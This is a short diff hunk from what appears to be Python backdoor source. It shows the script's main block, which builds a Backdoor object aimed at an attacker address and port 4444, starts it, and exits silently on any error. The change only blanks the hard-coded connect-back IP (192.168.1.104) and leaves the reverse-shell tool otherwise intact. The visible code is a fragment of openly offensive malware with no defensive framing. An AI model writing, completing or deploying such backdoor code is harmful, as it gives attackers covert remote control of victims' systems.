@@ -93,7 +93,7 @@ class Backdoor:
 
 if __name__ == "__main__":
    try:
-      backdoor = Backdoor("192.168.1.104", 4444)
+      backdoor = Backdoor("", 4444)
       backdoor.run()
    except Exception:
       sys.exit()
